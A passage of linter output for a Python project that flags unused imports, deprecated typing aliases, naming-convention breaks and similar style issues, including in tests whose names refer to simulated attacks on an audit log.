25 | # Import TARL VM system (compiler, runtime VM, etc.)
26 | from tarl.system import TARLSystem, get_system
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
27 |
28 | __all__ = [
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\config\__init__.py:27:1
   |
25 | import os
26 | from pathlib import Path
27 | from typing import Any, Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 |
29 | # Try to import tomllib (Python 3.11+) or fallback to toml
   |

F401 `typing.Dict` imported but unused
  --> tarl\config\__init__.py:27:25
   |
25 | import os
26 | from pathlib import Path
27 | from typing import Any, Dict, Optional
   |                         ^^^^
28 |
29 | # Try to import tomllib (Python 3.11+) or fallback to toml
   |
help: Remove unused import

F401 `typing.Optional` imported but unused
  --> tarl\config\__init__.py:27:31
   |
25 | import os
26 | from pathlib import Path
27 | from typing import Any, Dict, Optional
   |                               ^^^^^^^^
28 |
29 | # Try to import tomllib (Python 3.11+) or fallback to toml
   |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\diagnostics\__init__.py:28:1
   |
26 | from dataclasses import dataclass, field
27 | from enum import Enum
28 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> tarl\diagnostics\__init__.py:28:1
   |
26 | from dataclasses import dataclass, field
27 | from enum import Enum
28 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | logger = logging.getLogger(__name__)
   |

F401 `typing.Dict` imported but unused
  --> tarl\diagnostics\__init__.py:28:25
   |
26 | from dataclasses import dataclass, field
27 | from enum import Enum
28 | from typing import Any, Dict, List, Optional
   |                         ^^^^
29 |
30 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.List` imported but unused
  --> tarl\diagnostics\__init__.py:28:31
   |
26 | from dataclasses import dataclass, field
27 | from enum import Enum
28 | from typing import Any, Dict, List, Optional
   |                               ^^^^
29 |
30 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.Optional` imported but unused
  --> tarl\diagnostics\__init__.py:28:37
   |
26 | from dataclasses import dataclass, field
27 | from enum import Enum
28 | from typing import Any, Dict, List, Optional
   |                                     ^^^^^^^^
29 |
30 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\ffi\__init__.py:23:1
   |
21 | import logging
22 | from collections.abc import Callable
23 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> tarl\ffi\__init__.py:23:1
   |
21 | import logging
22 | from collections.abc import Callable
23 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |

F401 `typing.Dict` imported but unused
  --> tarl\ffi\__init__.py:23:25
   |
21 | import logging
22 | from collections.abc import Callable
23 | from typing import Any, Dict, List
   |                         ^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.List` imported but unused
  --> tarl\ffi\__init__.py:23:31
   |
21 | import logging
22 | from collections.abc import Callable
23 | from typing import Any, Dict, List
   |                               ^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\modules\__init__.py:24:1
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> tarl\modules\__init__.py:24:1
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |

F401 `typing.Any` imported but unused
  --> tarl\modules\__init__.py:24:20
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   |                    ^^^
25 |
26 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.Dict` imported but unused
  --> tarl\modules\__init__.py:24:25
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   |                         ^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.List` imported but unused
  --> tarl\modules\__init__.py:24:31
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   |                               ^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.Optional` imported but unused
  --> tarl\modules\__init__.py:24:37
   |
22 | import logging
23 | from pathlib import Path
24 | from typing import Any, Dict, List, Optional
   |                                     ^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

E741 Ambiguous variable name: `l`
 --> tarl\parser.py:5:28
  |
4 | def parse(text: str) -> TARL:
5 |     lines = [l.strip() for l in text.splitlines() if l.strip()]
  |                            ^
6 |     data = {"constraints": []}
7 |     key = None
  |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\stdlib\__init__.py:32:1
   |
30 | import logging
31 | from collections.abc import Callable
32 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 |
34 | logger = logging.getLogger(__name__)
   |

F401 `typing.Dict` imported but unused
  --> tarl\stdlib\__init__.py:32:25
   |
30 | import logging
31 | from collections.abc import Callable
32 | from typing import Any, Dict
   |                         ^^^^
33 |
34 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.Dict`

SIM115 Use a context manager for opening files
  --> tarl\stdlib\__init__.py:87:13
   |
85 |         "open": open,
86 |         "read": lambda path: (lambda f: f.read() if not f.close() else None)(
87 |             open(path)
   |             ^^^^
88 |         ),
89 |         "write": lambda path, data: (
   |

SIM115 Use a context manager for opening files
  --> tarl\stdlib\__init__.py:91:11
   |
89 |         "write": lambda path, data: (
90 |             lambda f: f.write(data) if not f.close() else len(data)
91 |         )(open(path, "w")),
   |           ^^^^
92 |         # Utility
93 |         "range": lambda *args: list(range(*args)),
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> tarl\tooling\__init__.py:23:1
   |
22 | import logging
23 | from typing import Any, Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |

F401 `typing.Any` imported but unused
  --> tarl\tooling\__init__.py:23:20
   |
22 | import logging
23 | from typing import Any, Dict, Optional
   |                    ^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.Dict` imported but unused
  --> tarl\tooling\__init__.py:23:25
   |
22 | import logging
23 | from typing import Any, Dict, Optional
   |                         ^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

F401 `typing.Optional` imported but unused
  --> tarl\tooling\__init__.py:23:31
   |
22 | import logging
23 | from typing import Any, Dict, Optional
   |                               ^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Remove unused import

SIM102 Use a single `if` statement instead of nested `if` statements
   --> tarl_os\bridge.py:124:9
    |
122 |               Function result or None on error
123 |           """
124 | /         if module_name not in self.module_cache:
125 | |             if not self.load_module(module_name):
    | |_________________________________________________^
126 |                   return None
    |
help: Combine `if` statements using `and`

F821 Undefined name `prefix`
    --> tarl_os\tests\god_tier_stress_tests.py:1555:60
     |
1553 |             scenarios.append(
1554 |                 TestScenario(
1555 |                     scenario_id=self._generate_scenario_id(prefix),
     |                                                            ^^^^^^
1556 |                     title=f"{category.value.title()} Test Scenario {i+1}"
1557 |                     + (" [FORCED FAILURE]" if is_forced_failure else ""),
     |

F821 Undefined name `prefix`
    --> tarl_os\tests\god_tier_stress_tests.py:1563:37
     |
1561 |                     attack_vectors=[
1562 |                         AttackVector(
1563 |                             name=f"{prefix.lower()}_attack_{i}",
     |                                     ^^^^^^
1564 |                             technique=f"{category.value} attack technique {i+1}",
1565 |                             target_component="tarl_os",
     |

N817 CamelCase `Path` imported as acronym `P`
   --> temporal\workflows\atomic_security_activities.py:146:29
    |
144 |     try:
145 |         import sys
146 |         from pathlib import Path as P
    |                             ^^^^^^^^^
147 |
148 |         # Add src to path
    |

N817 CamelCase `Path` imported as acronym `P`
   --> temporal\workflows\atomic_security_activities.py:302:29
    |
300 |     try:
301 |         import sys
302 |         from pathlib import Path as P
    |                             ^^^^^^^^^
303 |
304 |         # Add src to path
    |

N817 CamelCase `Path` imported as acronym `P`
   --> temporal\workflows\atomic_security_activities.py:365:29
    |
363 |     try:
364 |         import sys
365 |         from pathlib import Path as P
    |                             ^^^^^^^^^
366 |
367 |         # Add src to path
    |

E712 Avoid equality comparisons to `True`; use `status["active"]:` for truth checks
  --> tests\integration\test_sovereign_stack.py:89:20
   |
87 |             thirsty.start()
88 |             status = thirsty.get_status()
89 |             assert status["active"] == True
   |                    ^^^^^^^^^^^^^^^^^^^^^^^^
90 |             assert status["node_version"] is not None
91 |             assert status["cli_exists"] == True
   |
help: Replace with `status["active"]`

E712 Avoid equality comparisons to `True`; use `status["cli_exists"]:` for truth checks
  --> tests\integration\test_sovereign_stack.py:91:20
   |
89 |             assert status["active"] == True
90 |             assert status["node_version"] is not None
91 |             assert status["cli_exists"] == True
   |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
92 |             thirsty.stop()
93 |         except RuntimeError as e:
   |
help: Replace with `status["cli_exists"]`

E712 Avoid equality comparisons to `True`; use `result:` for truth checks
   --> tests\integration\test_sovereign_stack.py:111:20
    |
109 |             code = "drink x = 42\npour x"
110 |             result = thirsty.compile_and_run(code)
111 |             assert result == True, "Should successfully compile simple code"
    |                    ^^^^^^^^^^^^^^
112 |
113 |             thirsty.stop()
    |
help: Replace with `result`

E712 Avoid equality comparisons to `True`; use `status["active"]:` for truth checks
   --> tests\integration\test_sovereign_stack.py:166:24
    |
165 |             if waterfall.active:
166 |                 assert status["active"] == True
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^
167 |                 assert "vpn" in status
168 |                 assert "firewalls" in status
    |
help: Replace with `status["active"]`

E712 Avoid equality comparisons to `False`; use `not subsystem.active:` for false checks
   --> tests\integration\test_sovereign_stack.py:288:20
    |
286 |         # Verify shutdown
287 |         for subsystem in boot.subsystems.values():
288 |             assert subsystem.active == False
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^
289 |
290 |     def test_subsystem_isolation(self):
    |
help: Replace with `not subsystem.active`

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> tests\test_100_percent_coverage.py:21:9
   |
19 |           generates a runtime key if none is provided to its constructor.
20 |           """
21 | /         with tempfile.TemporaryDirectory() as tmpdir:
22 | |             # Also ensure the environment variable is not set
23 | |             with patch.dict("os.environ", {}, clear=True):
   | |__________________________________________________________^
24 |                   # UserManager initializes SecureStorage() internally
25 |                   manager = UserManager(users_file=os.path.join(tmpdir, "users.json"))
   |
help: Combine `with` statements

N801 Class name `TestVector1_GenesisKeyDeletion` should use CapWords convention
  --> tests\test_12_vector_constitutional_break.py:53:7
   |
53 | class TestVector1_GenesisKeyDeletion:
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
54 |     """
55 |     VECTOR 1: Genesis Key Deletion & Regeneration Attack
   |

N801 Class name `TestVector2_GenesisPublicKeyReplacement` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:149:7
    |
149 | class TestVector2_GenesisPublicKeyReplacement:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
150 |     """
151 |     VECTOR 2: Genesis Public Key Replacement Attack
    |

N801 Class name `TestVector11_FileSystemFullWipe` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:257:7
    |
257 | class TestVector11_FileSystemFullWipe:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
258 |     """
259 |     VECTOR 11: File System Full Wipe
    |

N801 Class name `TestVector5_LogTruncation` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:337:7
    |
337 | class TestVector5_LogTruncation:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^
338 |     """
339 |     VECTOR 5: Log Truncation Attack
    |

N801 Class name `TestVector6_MiddleChainMutation` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:395:7
    |
395 | class TestVector6_MiddleChainMutation:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
396 |     """
397 |     VECTOR 6: Middle-Chain Mutation
    |

N801 Class name `TestVector7_ReplayDeterminism` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:455:7
    |
455 | class TestVector7_ReplayDeterminism:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
456 |     """
457 |     VECTOR 7: Replay Determinism Break
    |

N801 Class name `TestVector9_ConcurrentRaceCondition` should use CapWords convention
   --> tests\test_12_vector_constitutional_break.py:556:7
    |
556 | class TestVector9_ConcurrentRaceCondition:
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
557 |     """
558 |     VECTOR 9: Concurrent Race Condition
    |

F401 [*] `pytest` imported but unused
  --> tests\test_alpha_red.py:10:8
   |
 8 | sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 9 |
10 | import pytest
   |        ^^^^^^
   |
help: Remove unused import: `pytest`

F841 Local variable `tests` is assigned to but never used
   --> tests\test_anti_sovereign_stress_tests.py:102:13
    |
100 |         with tempfile.TemporaryDirectory() as tmpdir:
101 |             generator = AntiSovereignStressTestGenerator(data_dir=tmpdir)
102 |             tests = generator.generate_all_tests()
    |             ^^^^^
103 |
104 |             filepath = generator.export_tests()
    |
help: Remove assignment to unused variable `tests`

F841 Local variable `tests` is assigned to but never used
   --> tests\test_anti_sovereign_stress_tests.py:117:13
    |
115 |         with tempfile.TemporaryDirectory() as tmpdir:
116 |             generator = AntiSovereignStressTestGenerator(data_dir=tmpdir)
117 |             tests = generator.generate_all_tests()
    |             ^^^^^
118 |
119 |             summary = generator.generate_summary()
    |
help: Remove assignment to unused variable `tests`

F401 `app.governance.genesis_continuity.GenesisContinuityGuard` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_attack_simulation_suite.py:38:9
   |
36 |     from app.governance.external_merkle_anchor import ExternalMerkleAnchor
37 |     from app.governance.genesis_continuity import (
38 |         GenesisContinuityGuard,
   |         ^^^^^^^^^^^^^^^^^^^^^^
39 |         GenesisDiscontinuityError,
40 |         GenesisReplacementError,
   |
help: Remove unused import

F401 `app.governance.genesis_continuity.GenesisReplacementError` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_attack_simulation_suite.py:40:9
   |
38 |         GenesisContinuityGuard,
39 |         GenesisDiscontinuityError,
40 |         GenesisReplacementError,
   |         ^^^^^^^^^^^^^^^^^^^^^^^
41 |     )
42 |     from app.governance.sovereign_audit_log import (
   |
help: Remove unused import

F401 `app.governance.sovereign_audit_log.GenesisKeyPair` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_attack_simulation_suite.py:43:9
   |
41 |     )
42 |     from app.governance.sovereign_audit_log import (
43 |         GenesisKeyPair,
   |         ^^^^^^^^^^^^^^
44 |         SovereignAuditLog,
45 |     )
   |
help: Remove unused import: `app.governance.sovereign_audit_log.GenesisKeyPair`

F401 [*] `tempfile` imported but unused
 --> tests\test_attack_train_loop.py:6:8
  |
5 | import json
6 | import tempfile
  |        ^^^^^^^^
7 | from pathlib import Path
  |
help: Remove unused import: `tempfile`

F401 [*] `pytest` imported but unused
  --> tests\test_attack_train_loop.py:9:8
   |
 7 | from pathlib import Path
 8 |
 9 | import pytest
   |        ^^^^^^
10 |
11 | from app.agents.attack_train_loop import AttackTrainLoop
   |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
  --> tests\test_bft_deployed.py:24:8
   |
22 | from datetime import datetime, timezone
23 |
24 | import pytest
   |        ^^^^^^
25 |
26 | sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
   |
help: Remove unused import: `pytest`

UP017 [*] Use `datetime.UTC` alias
  --> tests\test_bft_deployed.py:49:32
   |
47 |         reasons=[],
48 |         constraints_applied=ConstraintsApplied(),
49 |         timestamp=datetime.now(timezone.utc).isoformat(),
   |                                ^^^^^^^^^^^^
50 |         signature=Signature(alg="ed25519", kid=f"test_{head}", sig="test_sig"),
51 |     )
   |
help: Convert to `datetime.UTC` alias

B017 Do not assert blind exception: `Exception`
   --> tests\test_cathedral_infrastructure.py:266:14
    |
264 |         policy = RetryPolicy(max_attempts=3, initial_delay=0.01)
265 |
266 |         with pytest.raises(Exception):  # Should fail after retries
    |              ^^^^^^^^^^^^^^^^^^^^^^^^
267 |             bus.request_service(
268 |                 "test_service",
    |

F401 [*] `pytest` imported but unused
  --> tests\test_containment.py:8:8
   |
 6 | sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 7 |
 8 | import pytest
   |        ^^^^^^
 9 |
10 | from cerberus.sase.policy.containment import (
   |
help: Remove unused import: `pytest`

F401 [*] `cerberus.sase.policy.containment.ContainmentOrchestrator` imported but unused
  --> tests\test_containment.py:13:5
   |
11 |     ALLOWED_ACTION_TYPES,
12 |     ActionValidator,
13 |     ContainmentOrchestrator,
   |     ^^^^^^^^^^^^^^^^^^^^^^^
14 |     ContainmentRequest,
15 |     MerkleProofGenerator,
   |
help: Remove unused import: `cerberus.sase.policy.containment.ContainmentOrchestrator`

F401 [*] `time` imported but unused
 --> tests\test_deadman_switch.py:6:8
  |
5 | import threading
6 | import time
  |        ^^^^
7 |
8 | import pytest
  |
help: Remove unused import: `time`

F401 [*] `pytest` imported but unused
  --> tests\test_deadman_switch.py:8:8
   |
 6 | import time
 7 |
 8 | import pytest
   |        ^^^^^^
 9 |
10 | from app.resilience.deadman_switch import DeadmanSwitch
   |
help: Remove unused import: `pytest`

F401 [*] `json` imported but unused
  --> tests\test_enterprise_monolithic.py:16:8
   |
15 | import base64
16 | import json
   |        ^^^^
17 | import os
18 | import tempfile
   |
help: Remove unused import: `json`

F401 [*] `unittest.mock.Mock` imported but unused
  --> tests\test_enterprise_monolithic.py:22:27
   |
20 | import time
21 | from pathlib import Path
22 | from unittest.mock import Mock, patch
   |                           ^^^^
23 |
24 | import pytest
   |
help: Remove unused import

F401 [*] `unittest.mock.patch` imported but unused
  --> tests\test_enterprise_monolithic.py:22:33
   |
20 | import time
21 | from pathlib import Path
22 | from unittest.mock import Mock, patch
   |                                 ^^^^^
23 |
24 | import pytest
   |
help: Remove unused import

F841 Local variable `backup_dir` is assigned to but never used
   --> tests\test_enterprise_monolithic.py:112:9
    |
111 |         # Check that backup was created
112 |         backup_dir = Path(temp_vault_dir).parent / "vault_backups"
    |         ^^^^^^^^^^
113 |         # Note: backup_dir might not exist in all test scenarios
    |
help: Remove assignment to unused variable `backup_dir`

E722 Do not use bare `except`
   --> tests\test_enterprise_monolithic.py:325:13
    |
323 |             try:
324 |                 cb.call(lambda: 1 / 0)  # Raises ZeroDivisionError
325 |             except:
    |             ^^^^^^
326 |                 pass
    |

F811 [*] Redefinition of unused `json` from line 16
   --> tests\test_enterprise_monolithic.py:468:16
    |
466 |     def test_serialization(self):
467 |         """Test error aggregator serialization."""
468 |         import json
    |                ^^^^ `json` redefined here
469 |
470 |         from src.app.core.error_aggregator import GlobalErrorAggregator
    |
   ::: tests\test_enterprise_monolithic.py:16:8
    |
 15 | import base64
 16 | import json
    |        ---- previous definition of `json` here
 17 | import os
 18 | import tempfile
    |
help: Remove definition: `json`

F401 [*] `src.app.pipeline.signal_flows.CircuitBreaker` imported but unused
   --> tests\test_enterprise_monolithic.py:588:13
    |
586 |         """Test vault and audit log integration with real component flow."""
587 |         from src.app.pipeline.signal_flows import (
588 |             CircuitBreaker,
    |             ^^^^^^^^^^^^^^
589 |             circuit_breakers,
590 |             redact_pii,
    |
help: Remove unused import: `src.app.pipeline.signal_flows.CircuitBreaker`

B007 Loop control variable `i` not used within loop body
   --> tests\test_enterprise_monolithic.py:613:13
    |
612 |         # Simulate validation failures (e.g., forbidden phrases)
613 |         for i in range(cb.failure_threshold):
    |             ^
614 |             try:
615 |                 cb.call(
    |
help: Rename unused `i` to `_i`

F401 [*] `hashlib` imported but unused
  --> tests\test_formal_properties.py:20:8
   |
18 | from __future__ import annotations
19 |
20 | import hashlib
   |        ^^^^^^^
21 | import json
22 | import os
   |
help: Remove unused import: `hashlib`

F401 [*] `json` imported but unused
  --> tests\test_formal_properties.py:21:8
   |
20 | import hashlib
21 | import json
   |        ^^^^
22 | import os
23 | import sys
   |
help: Remove unused import: `json`

F401 [*] `psia.canonical.ledger.LedgerBlock` imported but unused
  --> tests\test_formal_properties.py:38:67
   |
37 | from psia.canonical.capability_authority import CapabilityAuthority
38 | from psia.canonical.ledger import DurableLedger, ExecutionRecord, LedgerBlock
   |                                                                   ^^^^^^^^^^^
39 | from psia.crypto.ed25519_provider import Ed25519Provider, KeyStore
40 | from psia.crypto.rfc3161_provider import LocalTSA
   |
help: Remove unused import: `psia.canonical.ledger.LedgerBlock`

E402 Module level import not at top of file
  --> tests\test_full_integration.py:10:1
   |
 8 |     sys.path.insert(0, src_path)
 9 |
10 | from app.agents.codex_deus_maximus import create_codex
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 `app.core.sensor_fusion.SensorMetadata` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_god_tier_systems.py:47:60
   |
45 |     import numpy as np
46 |
47 |     from app.core.sensor_fusion import SensorFusionEngine, SensorMetadata, SensorType
   |                                                            ^^^^^^^^^^^^^^
48 |
49 |     NUMPY_AVAILABLE = True
   |
help: Remove unused import

F401 `app.core.sensor_fusion.SensorType` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_god_tier_systems.py:47:76
   |
45 |     import numpy as np
46 |
47 |     from app.core.sensor_fusion import SensorFusionEngine, SensorMetadata, SensorType
   |                                                                            ^^^^^^^^^^
48 |
49 |     NUMPY_AVAILABLE = True
   |
help: Remove unused import

F401 [*] `json` imported but unused
 --> tests\test_governance_manager.py:5:8
  |
3 | """
4 |
5 | import json
  |        ^^^^
6 | import tempfile
7 | from pathlib import Path
  |
help: Remove unused import: `json`

F401 [*] `tempfile` imported but unused
 --> tests\test_governance_manager.py:6:8
  |
5 | import json
6 | import tempfile
  |        ^^^^^^^^
7 | from pathlib import Path
  |
help: Remove unused import: `tempfile`

F401 [*] `pathlib.Path` imported but unused
 --> tests\test_governance_manager.py:7:21
  |
5 | import json
6 | import tempfile
7 | from pathlib import Path
  |                     ^^^^
8 |
9 | import pytest
  |
help: Remove unused import: `pathlib.Path`

F401 [*] `os` imported but unused
  --> tests\test_immutable_audit_log.py:15:8
   |
13 | import hashlib
14 | import json
15 | import os
   |        ^^
16 | import tempfile
   |
help: Remove unused import: `os`

F401 [*] `tempfile` imported but unused
  --> tests\test_immutable_audit_log.py:16:8
   |
14 | import json
15 | import os
16 | import tempfile
   |        ^^^^^^^^
17 |
18 | import pytest
   |
help: Remove unused import: `tempfile`

F841 Local variable `f` is assigned to but never used
   --> tests\test_immutable_audit_log.py:142:55
    |
140 |         """Empty file returns False."""
141 |         log_path = str(tmp_path / "empty.log")
142 |         with open(log_path, "w", encoding="utf-8") as f:
    |                                                       ^
143 |             pass  # empty
    |
help: Remove assignment to unused variable `f`

E741 Ambiguous variable name: `l`
   --> tests\test_immutable_audit_log.py:208:36
    |
207 |         with open(tmp_log.log_path, encoding="utf-8") as f:
208 |             lines = [l.strip() for l in f.readlines() if l.strip()]
    |                                    ^
209 |         assert len(lines) == 6  # genesis + 5
    |

F403 `from cognition.invariants import *` used; unable to detect undefined names
 --> tests\test_invariants.py:1:1
  |
1 | from cognition.invariants import *
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F405 `invariant_single_authority` may be undefined, or defined from star imports
 --> tests\test_invariants.py:5:12
  |
4 | def test_single_authority():
5 |     assert invariant_single_authority([])
  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |     assert invariant_single_authority(["Galahad"])
7 |     assert not invariant_single_authority(["Galahad", "Cerberus"])
  |

F405 `invariant_single_authority` may be undefined, or defined from star imports
 --> tests\test_invariants.py:6:12
  |
4 | def test_single_authority():
5 |     assert invariant_single_authority([])
6 |     assert invariant_single_authority(["Galahad"])
  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |     assert not invariant_single_authority(["Galahad", "Cerberus"])
  |

F405 `invariant_single_authority` may be undefined, or defined from star imports
 --> tests\test_invariants.py:7:16
  |
5 |     assert invariant_single_authority([])
6 |     assert invariant_single_authority(["Galahad"])
7 |     assert not invariant_single_authority(["Galahad", "Cerberus"])
  |                ^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F405 `invariant_contraction_on_failure` may be undefined, or defined from star imports
  --> tests\test_invariants.py:11:12
   |
10 | def test_contraction_on_failure():
11 |     assert invariant_contraction_on_failure(False)
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |     assert not invariant_contraction_on_failure(True)
   |

F405 `invariant_contraction_on_failure` may be undefined, or defined from star imports
  --> tests\test_invariants.py:12:16
   |
10 | def test_contraction_on_failure():
11 |     assert invariant_contraction_on_failure(False)
12 |     assert not invariant_contraction_on_failure(True)
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `tempfile` imported but unused
 --> tests\test_jurisdiction_loader.py:4:8
  |
3 | import sys
4 | import tempfile
  |        ^^^^^^^^
5 | from pathlib import Path
  |
help: Remove unused import: `tempfile`

F401 [*] `pytest` imported but unused
  --> tests\test_jurisdiction_loader.py:9:8
   |
 7 | sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 8 |
 9 | import pytest
   |        ^^^^^^
10 |
11 | from app.governance.jurisdiction_loader import JurisdictionLoader
   |
help: Remove unused import: `pytest`

F401 [*] `unittest.mock.MagicMock` imported but unused
 --> tests\test_miniature_office_adapter.py:6:27
  |
5 | import os
6 | from unittest.mock import MagicMock, patch
  |                           ^^^^^^^^^
7 |
8 | import pytest
  |
help: Remove unused import: `unittest.mock.MagicMock`

F401 [*] `pytest` imported but unused
  --> tests\test_miniature_office_adapter.py:8:8
   |
 6 | from unittest.mock import MagicMock, patch
 7 |
 8 | import pytest
   |        ^^^^^^
 9 |
10 | # ---------------------------------------------------------------------------
   |
help: Remove unused import: `pytest`

F401 [*] `unittest.mock.patch` imported but unused
 --> tests\test_osint_plugins.py:6:38
  |
4 | import sys
5 | from pathlib import Path
6 | from unittest.mock import MagicMock, patch
  |                                      ^^^^^
7 |
8 | sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
  |
help: Remove unused import: `unittest.mock.patch`

F401 [*] `pytest` imported but unused
  --> tests\test_osint_plugins.py:10:8
   |
 8 | sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 9 |
10 | import pytest
   |        ^^^^^^
11 |
12 | # ΓöÇΓöÇ Stub heavy dependencies ΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇΓöÇ
   |
help: Remove unused import: `pytest`

F401 `app.gui.dashboard_main.DashboardMainWindow` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> tests\test_platform_tiers.py:529:48
    |
527 |         # For now, just verify the import and registration logic exists
528 |         try:
529 |             from app.gui.dashboard_main import DashboardMainWindow
    |                                                ^^^^^^^^^^^^^^^^^^^
530 |
531 |             # If we can import it, the registration code exists
    |
help: Remove unused import: `app.gui.dashboard_main.DashboardMainWindow`

F401 `app.gui.leather_book_interface.LeatherBookInterface` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> tests\test_platform_tiers.py:541:56
    |
539 |         # For now, just verify the import and registration logic exists
540 |         try:
541 |             from app.gui.leather_book_interface import LeatherBookInterface
    |                                                        ^^^^^^^^^^^^^^^^^^^^
542 |
543 |             # If we can import it, the registration code exists
    |
help: Remove unused import: `app.gui.leather_book_interface.LeatherBookInterface`

F401 [*] `time` imported but unused
  --> tests\test_psia_canonical.py:12:8
   |
10 | from __future__ import annotations
11 |
12 | import time
   |        ^^^^
13 | from datetime import datetime, timedelta, timezone
   |
help: Remove unused import: `time`

F401 [*] `datetime.datetime` imported but unused
  --> tests\test_psia_canonical.py:13:22
   |
12 | import time
13 | from datetime import datetime, timedelta, timezone
   |                      ^^^^^^^^
14 |
15 | import pytest
   |
help: Remove unused import

F401 [*] `datetime.timedelta` imported but unused
  --> tests\test_psia_canonical.py:13:32
   |
12 | import time
13 | from datetime import datetime, timedelta, timezone
   |                                ^^^^^^^^^
14 |
15 | import pytest
   |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
  --> tests\test_psia_canonical.py:13:43
   |
12 | import time
13 | from datetime import datetime, timedelta, timezone
   |                                           ^^^^^^^^
14 |
15 | import pytest
   |
help: Remove unused import

